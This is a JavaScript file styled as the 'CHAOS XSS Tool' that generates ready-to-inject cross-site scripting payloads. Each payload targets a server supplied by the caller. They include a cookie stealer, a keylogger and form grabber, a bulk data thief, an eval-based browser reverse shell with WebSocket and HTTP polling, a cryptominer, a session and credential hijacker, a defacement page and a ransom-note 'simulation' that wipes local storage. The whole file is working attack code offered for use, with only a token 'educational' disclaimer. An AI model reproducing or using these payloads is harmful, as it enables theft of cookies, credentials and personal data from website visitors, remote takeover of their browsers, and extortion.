// XSS Exploit Generators - CHAOS XSS Tool v666.1

const XSS_EXPLOITS = {
    // Cookie Stealer
    cookieStealer: (serverUrl) => `<script>
// Cookie Stealer by CHAOS XSS Tool v666.1
// Server: ${serverUrl}

function stealCookies() {
    var data = {
        cookies: document.cookie,
        url: window.location.href,
        domain: document.domain,
        title: document.title,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    // Send via fetch
    fetch('${serverUrl}/steal.php', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {'Content-Type': 'application/json'},
        mode: 'no-cors'
    });
    
    // Send via image as backup
    new Image().src = '${serverUrl}/steal.gif?data=' + encodeURIComponent(JSON.stringify(data));
    
    // Send via beacon API
    if (navigator.sendBeacon) {
        navigator.sendBeacon('${serverUrl}/steal.php', JSON.stringify(data));
    }
}

// Execute immediately
stealCookies();

// Also steal on page changes
window.addEventListener('beforeunload', stealCookies);
window.addEventListener('pagehide', stealCookies);

// Steal periodically
setInterval(stealCookies, 30000);

console.log('Cookie stealer activated!');
</script>`,

    // Keylogger
    keylogger: (serverUrl) => `<script>
// Keylogger by CHAOS XSS Tool v666.1
// Server: ${serverUrl}

var keystrokes = [];
var formData = {};

// Capture keydown events
document.addEventListener('keydown', function(e) {
    var data = {
        key: e.key,
        code: e.code,
        location: e.location,
        ctrlKey: e.ctrlKey,
        shiftKey: e.shiftKey,
        altKey: e.altKey,
        metaKey: e.metaKey,
        target: e.target.tagName,
        targetName: e.target.name || e.target.id || 'unknown',
        targetValue: e.target.value || '',
        timestamp: Date.now(),
        url: window.location.href
    };
    
    keystrokes.push(data);
    
    // Send immediately if sensitive key
    if (e.key === 'Enter' || e.key === 'Tab' || e.key === 'Password' || e.target.type === 'password') {
        sendKeylog();
    }
});

// Capture form submissions
document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = {
        action: form.action,
        method: form.method,
        inputs: []
    };
    
    var inputs = form.querySelectorAll('input, textarea, select');
    inputs.forEach(function(input) {
        data.inputs.push({
            name: input.name,
            type: input.type,
            value: input.value
        });
    });
    
    formData['form_' + Date.now()] = data;
    sendKeylog();
});

// Capture clipboard
document.addEventListener('copy', function(e) {
    var selection = window.getSelection().toString();
    if (selection) {
        keystrokes.push({
            type: 'copy',
            text: selection,
            timestamp: Date.now()
        });
    }
});

document.addEventListener('paste', function(e) {
    keystrokes.push({
        type: 'paste',
        timestamp: Date.now()
    });
});

function sendKeylog() {
    if (keystrokes.length === 0 && Object.keys(formData).length === 0) return;
    
    var payload = {
        keystrokes: keystrokes,
        forms: formData,
        url: window.location.href,
        timestamp: Date.now()
    };
    
    // Send via fetch
    fetch('${serverUrl}/keylog.php', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: {'Content-Type': 'application/json'},
        mode: 'no-cors'
    });
    
    // Send via beacon
    if (navigator.sendBeacon) {
        navigator.sendBeacon('${serverUrl}/keylog.php', JSON.stringify(payload));
    }
    
    // Reset arrays
    keystrokes = [];
    formData = {};
}

// Send every 10 seconds
setInterval(sendKeylog, 10000);

// Send on page unload
window.addEventListener('beforeunload', sendKeylog);
window.addEventListener('pagehide', sendKeylog);

console.log('Keylogger activated!');
</script>`,

    // Redirector
    redirector: (redirectUrl, delay = 3000) => `<script>
// Redirector by CHAOS XSS Tool v666.1
// Target: ${redirectUrl}
// Delay: ${delay}ms

setTimeout(function() {
    // Method 1: Direct redirect
    window.location.href = '${redirectUrl}';
    
    // Method 2: Replace current page
    // window.location.replace('${redirectUrl}');
    
    // Method 3: Open in new window
    // window.open('${redirectUrl}', '_blank');
    
    // Method 4: Meta refresh fallback
    var meta = document.createElement('meta');
    meta.httpEquiv = "refresh";
    meta.content = "0;url=${redirectUrl}";
    document.head.appendChild(meta);
    
    // Method 5: All links redirect
    document.querySelectorAll('a').forEach(function(link) {
        link.href = '${redirectUrl}';
    });
    
    // Method 6: Form action change
    document.querySelectorAll('form').forEach(function(form) {
        form.action = '${redirectUrl}';
    });
    
    // Method 7: History manipulation
    history.pushState({}, '', '${redirectUrl}');
    history.replaceState({}, '', '${redirectUrl}');
    
}, ${delay});

// Also redirect on various events
window.addEventListener('click', function() {
    window.location.href = '${redirectUrl}';
}, {once: true});

window.addEventListener('mousemove', function() {
    window.location.href = '${redirectUrl}';
}, {once: true});

window.addEventListener('scroll', function() {
    window.location.href = '${redirectUrl}';
}, {once: true});

console.log('Redirector activated! Will redirect to ${redirectUrl} in ${delay}ms');
</script>`,

    // Data Thief
    dataThief: (serverUrl) => `<script>
// Data Thief by CHAOS XSS Tool v666.1
// Server: ${serverUrl}

function stealData() {
    var data = {
        // Basic info
        url: window.location.href,
        domain: document.domain,
        title: document.title,
        referrer: document.referrer,
        lastModified: document.lastModified,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        
        // Browser info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        
        // Screen info
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        screenOrientation: screen.orientation ? screen.orientation.type : null,
        
        // Window info
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        
        // Storage
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        
        // Forms
        forms: [],
        
        // Links
        links: [],
        
        // Images
        images: [],
        
        // Scripts
        scripts: [],
        
        // Full HTML (limited)
        html: document.documentElement.outerHTML.substring(0, 50000),
        
        // Head content
        head: document.head ? document.head.innerHTML.substring(0, 10000) : '',
        
        // Meta tags
        metaTags: [],
        
        // Input fields
        inputs: [],
        
        // Timestamps
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // Get localStorage
    try {
        for (var key in localStorage) {
            data.localStorage[key] = localStorage[key];
        }
    } catch(e) {}
    
    // Get sessionStorage
    try {
        for (var key in sessionStorage) {
            data.sessionStorage[key] = sessionStorage[key];
        }
    } catch(e) {}
    
    // Get forms
    document.querySelectorAll('form').forEach(function(form, index) {
        var formData = {
            index: index,
            action: form.action,
            method: form.method,
            enctype: form.enctype,
            inputs: []
        };
        
        form.querySelectorAll('input, textarea, select, button').forEach(function(input) {
            formData.inputs.push({
                name: input.name,
                type: input.type,
                value: input.value,
                placeholder: input.placeholder,
                required: input.required,
                disabled: input.disabled
            });
        });
        
        data.forms.push(formData);
    });
    
    // Get links
    document.querySelectorAll('a[href]').forEach(function(link, index) {
        data.links.push({
            index: index,
            href: link.href,
            text: link.textContent,
            title: link.title
        });
    });
    
    // Get images
    document.querySelectorAll('img[src]').forEach(function(img, index) {
        data.images.push({
            index: index,
            src: img.src,
            alt: img.alt,
            title: img.title
        });
    });
    
    // Get scripts
    document.querySelectorAll('script[src]').forEach(function(script, index) {
        data.scripts.push({
            index: index,
            src: script.src,
            type: script.type
        });
    });
    
    // Get meta tags
    document.querySelectorAll('meta').forEach(function(meta, index) {
        data.metaTags.push({
            index: index,
            name: meta.name,
            content: meta.content,
            property: meta.property,
            httpEquiv: meta.httpEquiv
        });
    });
    
    // Get all inputs
    document.querySelectorAll('input').forEach(function(input, index) {
        data.inputs.push({
            index: index,
            type: input.type,
            name: input.name,
            id: input.id,
            value: input.value,
            placeholder: input.placeholder
        });
    });
    
    // Send data in chunks to avoid size limits
    var chunkSize = 8000; // 8KB chunks
    var jsonData = JSON.stringify(data);
    var chunks = [];
    
    for (var i = 0; i < jsonData.length; i += chunkSize) {
        chunks.push(jsonData.slice(i, i + chunkSize));
    }
    
    // Send chunks
    chunks.forEach(function(chunk, index) {
        var chunkData = {
            chunk: chunk,
            index: index,
            total: chunks.length,
            id: 'data_' + Date.now() + '_' + index
        };
        
        // Send via fetch
        fetch('${serverUrl}/data.php', {
            method: 'POST',
            body: JSON.stringify(chunkData),
            headers: {'Content-Type': 'application/json'},
            mode: 'no-cors'
        });
        
        // Send via beacon
        if (navigator.sendBeacon) {
            navigator.sendBeacon('${serverUrl}/data.php', JSON.stringify(chunkData));
        }
    });
    
    console.log('Data theft completed! Sent ' + chunks.length + ' chunks');
}

// Execute immediately
stealData();

// Also steal on page changes
window.addEventListener('beforeunload', stealData);
window.addEventListener('pagehide', stealData);
window.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'hidden') {
        stealData();
    }
});

// Steal periodically
setInterval(stealData, 60000); // Every minute

console.log('Data thief activated!');
</script>`,

    // Reverse Shell
    reverseShell: (serverUrl) => `<script>
// Reverse Shell by CHAOS XSS Tool v666.1
// Server: ${serverUrl}

var ws = null;
var commandInterval = null;

function connectShell() {
    try {
        // WebSocket connection
        ws = new WebSocket('ws://' + '${serverUrl}'.replace('http://', '').replace('https://', '') + ':8080');
        
        ws.onopen = function() {
            ws.send('XSS Shell Connected: ' + window.location.href);
            ws.send('User Agent: ' + navigator.userAgent);
            ws.send('Cookies: ' + document.cookie);
        };
        
        ws.onmessage = function(event) {
            var command = event.data;
            executeCommand(command);
        };
        
        ws.onerror = function(error) {
            console.log('WebSocket error:', error);
            fallbackHTTP();
        };
        
        ws.onclose = function() {
            console.log('WebSocket closed, retrying...');
            setTimeout(connectShell, 5000);
        };
        
    } catch(e) {
        console.log('WebSocket failed, using HTTP fallback');
        fallbackHTTP();
    }
}

function fallbackHTTP() {
    // HTTP polling fallback
    if (commandInterval) clearInterval(commandInterval);
    
    commandInterval = setInterval(function() {
        fetch('${serverUrl}/cmd.php')
            .then(response => response.text())
            .then(command => {
                if (command && command !== 'none') {
                    executeCommand(command);
                }
            })
            .catch(error => console.log('HTTP command error:', error));
    }, 3000);
}

function executeCommand(command) {
    try {
        var result = eval(command);
        var output = result !== undefined ? String(result) : 'Command executed';
        
        // Send result back
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send('Result: ' + output);
        } else {
            // Send via HTTP
            fetch('${serverUrl}/result.php?result=' + encodeURIComponent(output));
        }
        
    } catch(e) {
        var error = 'Error: ' + e.message;
        
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(error);
        } else {
            fetch('${serverUrl}/result.php?error=' + encodeURIComponent(error));
        }
    }
}

// Additional shell commands
window.xssShell = {
    execute: executeCommand,
    connect: connectShell,
    disconnect: function() {
        if (ws) ws.close();
        if (commandInterval) clearInterval(commandInterval);
    },
    info: function() {
        return {
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
    }
};

// Start connection
connectShell();

// Keep alive
setInterval(function() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send('ping');
    }
}, 30000);

console.log('Reverse shell activated!');
</script>`,

    // Advanced Exploits
    advancedExploits: {
        // Crypto Mining
        cryptoMiner: (walletAddress) => `<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
// Crypto Miner by CHAOS XSS Tool
var miner = new CoinHive.Anonymous('${walletAddress}');
miner.start();
console.log('Crypto miner started for wallet: ${walletAddress}');
</script>`,

        // Browser Fingerprinting
        browserFingerprint: (serverUrl) => `<script>
// Browser Fingerprinting by CHAOS XSS Tool
function getFingerprint() {
    var fingerprint = {
        // Canvas fingerprint
        canvas: function() {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('XSS Tool', 4, 45);
            return canvas.toDataURL();
        }(),
        
        // WebGL fingerprint
        webgl: function() {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            return gl.getParameter(gl.VENDOR) + '|' + gl.getParameter(gl.RENDERER);
        }(),
        
        // Audio fingerprint
        audio: function() {
            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            var oscillator = audioCtx.createOscillator();
            var analyser = audioCtx.createAnalyser();
            var gainNode = audioCtx.createGain();
            var scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
            
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
            
            gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            
            var audioData = [];
            scriptProcessor.onaudioprocess = function(bins) {
                audioData = bins.inputBuffer.getChannelData(0);
            };
            
            oscillator.start(audioCtx.currentTime);
            scriptProcessor.onaudioprocess = function() {
                oscillator.stop(audioCtx.currentTime);
                audioCtx.close();
            };
            
            return audioData.slice(0, 10).join(',');
        }(),
        
        // Basic info
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        
        // Screen info
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        screenOrientation: screen.orientation ? screen.orientation.type : null,
        
        // Window info
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        
        // Plugin info
        plugins: Array.from(navigator.plugins).map(p => p.name),
        
        // Font detection
        fonts: (function() {
            var fonts = ['Arial', 'Helvetica', 'Times', 'Times New Roman', 'Courier', 'Courier New'];
            var detected = [];
            fonts.forEach(font => {
                if (document.fonts.check('12px ' + font)) {
                    detected.push(font);
                }
            });
            return detected;
        })(),
        
        // Timezone
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Local storage
        localStorage: Object.keys(localStorage).length,
        sessionStorage: Object.keys(sessionStorage).length,
        
        // IndexedDB
        indexedDB: !!window.indexedDB,
        
        // WebGL
        webGL: !!window.WebGLRenderingContext,
        
        // Canvas
        canvas: !!window.HTMLCanvasElement,
        
        // Audio
        audio: !!window.AudioContext || !!window.webkitAudioContext,
        
        // Video
        video: !!window.HTMLVideoElement,
        
        // WebRTC
        webRTC: !!window.RTCPeerConnection || !!window.webkitRTCPeerConnection,
        
        // WebSocket
        webSocket: !!window.WebSocket,
        
        // Worker
        worker: !!window.Worker,
        
        // Service Worker
        serviceWorker: !!navigator.serviceWorker,
        
        // Geolocation
        geolocation: !!navigator.geolocation,
        
        // Notification
        notification: !!window.Notification,
        
        // Push
        push: !!window.PushManager,
        
        // Share
        share: !!navigator.share,
        
        // Vibration
        vibration: !!navigator.vibrate,
        
        // Battery
        battery: !!navigator.getBattery,
        
        // Connection
        connection: !!navigator.connection,
        
        // WebGL vendor and renderer
        webGLVendor: function() {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            return gl.getParameter(gl.VENDOR);
        }(),
        
        webGLRenderer: function() {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            return gl.getParameter(gl.RENDERER);
        }()
    };
    
    return fingerprint;
}

// Send fingerprint
var fingerprint = getFingerprint();
fetch('${serverUrl}/fingerprint.php', {
    method: 'POST',
    body: JSON.stringify(fingerprint),
    headers: {'Content-Type': 'application/json'}
});

console.log('Browser fingerprint sent!');
</script>`,

        // Session Hijacking
        sessionHijack: (serverUrl) => `<script>
// Session Hijacking by CHAOS XSS Tool

function hijackSession() {
    // Get all cookies
    var cookies = document.cookie.split(';');
    var sessionData = {
        cookies: [],
        localStorage: {},
        sessionStorage: {},
        url: window.location.href,
        timestamp: new Date().toISOString()
    };
    
    // Parse cookies
    cookies.forEach(function(cookie) {
        var parts = cookie.trim().split('=');
        sessionData.cookies.push({
            name: parts[0],
            value: parts[1],
            domain: document.domain,
            path: '/',
            secure: false,
            httpOnly: false
        });
    });
    
    // Get storage data
    try {
        for (var key in localStorage) {
            sessionData.localStorage[key] = localStorage[key];
        }
    } catch(e) {}
    
    try {
        for (var key in sessionStorage) {
            sessionData.sessionStorage[key] = sessionStorage[key];
        }
    } catch(e) {}
    
    // Send session data
    fetch('${serverUrl}/session.php', {
        method: 'POST',
        body: JSON.stringify(sessionData),
        headers: {'Content-Type': 'application/json'}
    });
    
    // Set up session synchronization
    setInterval(function() {
        // Monitor cookie changes
        var currentCookies = document.cookie;
        if (currentCookies !== sessionData.lastCookies) {
            sessionData.lastCookies = currentCookies;
            hijackSession();
        }
        
        // Monitor storage changes
        window.addEventListener('storage', function(e) {
            hijackSession();
        });
        
    }, 5000);
}

// Start hijacking
hijackSession();

// Hijack forms to capture credentials
document.querySelectorAll('form').forEach(function(form) {
    form.addEventListener('submit', function(e) {
        var formData = new FormData(form);
        var data = {};
        
        for (var [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // Send credentials
        fetch('${serverUrl}/credentials.php', {
            method: 'POST',
            body: JSON.stringify({
                url: window.location.href,
                formData: data,
                timestamp: new Date().toISOString()
            }),
            headers: {'Content-Type': 'application/json'}
        });
    });
});

console.log('Session hijacking activated!');
</script>`,

        // Defacement
        defacement: (message, color = '#ff0000') => `<script>
// Defacement by CHAOS XSS Tool

// Hide original content
document.documentElement.style.display = 'none';

// Create defacement page
var defaceHtml = \`
<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY CHAOS</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: ${color};
            font-family: monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            animation: glitch 2s infinite;
        }
        @keyframes glitch {
            0%,100%{text-shadow: 2px 2px #ff0000, -2px -2px #00ffff;}
            25%{text-shadow: -2px 2px #ff0000, 2px -2px #00ffff;}
            50%{text-shadow: 2px -2px #ff0000, -2px 2px #00ffff;}
            75%{text-shadow: -2px -2px #ff0000, 2px 2px #00ffff;}
        }
        h1 {
            font-size: 5em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.5em;
            margin-bottom: 30px;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <canvas class="matrix" id="matrix"></canvas>
    <div>
        <h1>DEFACED BY CHAOS</h1>
        <p>${message}</p>
        <p>Your security has been compromised</p>
        <p>Contact: chaos@dark.web</p>
    </div>
    <script>
        // Matrix effect
        var canvas = document.getElementById('matrix');
        var ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        var matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|\\]}";
        var matrixArray = matrix.split("");
        
        var fontSize = 10;
        var columns = canvas.width / fontSize;
        var drops = [];
        
        for(var x = 0; x < columns; x++) {
            drops[x] = 1;
        }
        
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '${color}';
            ctx.font = fontSize + 'px monospace';
            
            for(var i = 0; i < drops.length; i++) {
                var text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(draw, 35);
        
        window.addEventListener('resize', function() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>\`;

// Replace entire page
document.open();
document.write(defaceHtml);
document.close();

// Prevent going back
history.pushState(null, null, location.href);
window.addEventListener('popstate', function(event) {
    history.pushState(null, null, location.href);
});

// Disable right click
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Disable F12
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
    }
});

// Make it persistent
localStorage.setItem('defaced', 'true');
sessionStorage.setItem('defaced', 'true');

console.log('Website defaced!');
</script>`,

        // Ransomware Simulation
        ransomware: (bitcoinAddress, amount = '0.1') => `<script>
// Ransomware Simulation by CHAOS XSS Tool
// FOR EDUCATIONAL PURPOSES ONLY!

function simulateRansomware() {
    // Encrypt localStorage and sessionStorage
    function encryptStorage() {
        var encryptedData = {};
        
        // Encrypt localStorage
        for (var key in localStorage) {
            encryptedData['local_' + key] = btoa(localStorage[key]); // Simple base64 "encryption"
        }
        
        // Encrypt sessionStorage
        for (var key in sessionStorage) {
            encryptedData['session_' + key] = btoa(sessionStorage[key]);
        }
        
        // Clear original storage
        localStorage.clear();
        sessionStorage.clear();
        
        // Store encrypted data
        localStorage.setItem('encrypted_data', JSON.stringify(encryptedData));
    }
    
    // Show ransom note
    function showRansomNote() {
        var ransomHtml = \`
        <!DOCTYPE html>
        <html>
        <head>
            <title>YOUR FILES HAVE BEEN ENCRYPTED</title>
            <style>
                body {
                    margin: 0;
                    padding: 20px;
                    background: #000;
                    color: #f00;
                    font-family: monospace;
                    text-align: center;
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    padding: 30px;
                    border: 2px solid #f00;
                    background: #111;
                }
                h1 {
                    color: #f00;
                    font-size: 3em;
                    margin-bottom: 20px;
                }
                .warning {
                    color: #ff0;
                    font-size: 1.5em;
                    margin-bottom: 30px;
                }
                .instructions {
                    color: #0f0;
                    font-size: 1.2em;
                    margin-bottom: 20px;
                }
                .bitcoin {
                    background: #333;
                    padding: 15px;
                    border-radius: 5px;
                    margin: 20px 0;
                    font-family: monospace;
                    word-break: break-all;
                }
                .timer {
                    font-size: 2em;
                    color: #ff0;
                    margin: 20px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>YOUR DATA HAS BEEN ENCRYPTED!</h1>
                <div class="warning">
                    ⚠️ All your local storage data has been encrypted! ⚠️
                </div>
                <div class="instructions">
                    To decrypt your data, you need to pay the ransom:
                </div>
                <div class="bitcoin">
                    Bitcoin Address: ${bitcoinAddress}<br>
                    Amount: ${amount} BTC
                </div>
                <div class="timer" id="timer">
                    Time remaining: 24:00:00
                </div>
                <div class="instructions">
                    This is a simulation for educational purposes only!<br>
                    Your actual files are NOT encrypted.
                </div>
            </div>
            <script>
                // Countdown timer
                var timeLeft = 24 * 60 * 60; // 24 hours in seconds
                var timerElement = document.getElementById('timer');
                
                function updateTimer() {
                    var hours = Math.floor(timeLeft / 3600);
                    var minutes = Math.floor((timeLeft % 3600) / 60);
                    var seconds = timeLeft % 60;
                    
                    timerElement.textContent = 'Time remaining: ' + 
                        hours.toString().padStart(2, '0') + ':' +
                        minutes.toString().padStart(2, '0') + ':' +
                        seconds.toString().padStart(2, '0');
                    
                    if (timeLeft > 0) {
                        timeLeft--;
                        setTimeout(updateTimer, 1000);
                    } else {
                        timerElement.textContent = 'Time expired!';
                    }
                }
                
                updateTimer();
            </script>
        </body>
        </html>
        \`;
        
        document.open();
        document.write(ransomHtml);
        document.close();
    }
    
    // Execute simulation
    encryptStorage();
    showRansomNote();
    
    // Make it persistent
    localStorage.setItem('ransomware_simulated', 'true');
    
    console.log('Ransomware simulation completed!');
}

// Check if already simulated
if (!localStorage.getItem('ransomware_simulated')) {
    simulateRansomware();
}

console.log('Ransomware simulation activated!');
</script>`
    }
};

// Export for use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { XSS_EXPLOITS };
}
